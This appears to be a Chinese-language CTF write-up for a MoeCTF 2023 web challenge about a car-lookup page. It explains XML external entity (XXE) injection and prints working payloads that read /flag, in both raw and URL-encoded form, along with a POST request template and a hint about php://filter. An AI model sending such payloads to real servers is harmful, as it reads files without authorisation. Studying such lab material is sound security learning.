
#wp #web

【[[WEB]]】[[xxe]] - [[扩展题目]]

创建时间：2025-07-06 02:54

参考文章：
[MoeCTF_2023/Official_Writeup/Web.md at main · XDSEC/MoeCTF_2023](https://github.com/XDSEC/MoeCTF_2023/blob/main/Official_Writeup/Web.md)
了解你的座驾
### 解题过程
##  题目背景

- 前端点击查询某款车时，会向后台 POST 一个表单字段：`xml_content`，内容类似：
    
    ```
    <xml><name>Dodge Viper</name></xml>
    ```
    
- 后端会解析这个 XML，然后返回对应车型的信息。这个流程暗示了可能存在 XXE 漏洞：如果允许定义外部实体（external entity），就可能读取服务器本地文件内容 ([CSDN](https://blog.csdn.net/Leaf_initial/article/details/133924281?utm_source=chatgpt.com))。
    

---

## XXE 基础与知识点

1. **什么是实体（ENTITY）？**  
    在 XML DTD 中，可以通过 `<!ENTITY 名称 SYSTEM "URI">` 定义一个外部实体。
    
2. **如何利用 XXE 读取文件？**  
    定义一个实体指向本地文件（如 `/flag`），然后在 XML body 里调用该实体就能让解析器读取文件内容并插入解析结果。
    

---

## 漏洞利用思路

- 控制 `xml_content`，在 XML 里写入自定义的 DTD 定义：
    
    1. 定义外部实体 `file`，指向本地 `flag` 文件；
        
    2. 在 `<name>` 标签里引用该实体 `&file;`；
        
    3. Send 给后端，等待解析后返回该文件内容。
        

---
### 1. 编写 XXE Payload

```html
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE any [
  <!-- 定义一个外部实体 file，读取服务器 /flag 文件 -->
  <!ENTITY file SYSTEM "file:///flag">
]>
<xml>
  <name>&file;</name>
</xml>
```

- `<!DOCTYPE any […]>`：告诉解析器要定义实体；
    
- `SYSTEM "file:///flag"`：指向服务器根目录下的 `flag` 文件；
    
- `<name>&file;</name>`：在 XML 里插入实体引用，解析时会被替换为 flag 内容。
    

---

### 2. URL 编码 Payload

发送表单时必须 URL encode，否则被当作普通文本：

```html
xml_content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A%3C!DOCTYPE%20any%20[%0A%20%20<!ENTITY%20file%20SYSTEM%20%22file%3A///flag%22>%0A]%3E%0A<xml><name>&file;</name></xml>
```

**关键要点**：URL encode 后的 `&file;` 才会正确送达后端 ([CSDN](https://blog.csdn.net/Leaf_initial/article/details/133924281?utm_source=chatgpt.com))。

---

### 3. 使用 Burp 或 curl 提交

```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

xml_content=<经过 URL 编码的 XXE Payload>
```

如果 XXE 成功，可以在响应中看到类似 flag 的内容。

![](https://cdn.jsdelivr.net/gh/wydyxhxs/images/pic/20250716234532511.png)
Base64解码得到flag
---

## 总结


    
    - 学会如何定义 XML 外部实体；
        
    - 理解 ENTITY 如何被解析器展开；
        
    - 注意 **URL encode** 是利用 XXE 的关键点；
        
    - 学会从 HTTP 报文角度理解漏洞流程；
        
-  **如果碰到复杂场景**，如需要绕过安全过滤：
    
    - 可以研究 `<!ENTITY file SYSTEM ...>` 的各种 URI 协议（如 `php://filter`）；
        
    - 模拟 Burp 插件自动化构造多个测试。
        

---

EXP

```
xml_content=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%0A
%3C!DOCTYPE%20xxe%20%5B%0A%20%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A///flag%22%3E%0A%5D%3E%0A
%3Cxml%3E%3Cname%3E%26xxe%3B%3C/name%3E%3C/xml%3E
```

- `%xx` 是 URL encode；
    
- `&xxe;` 会被解析器替换成 flag 内容。
    

---

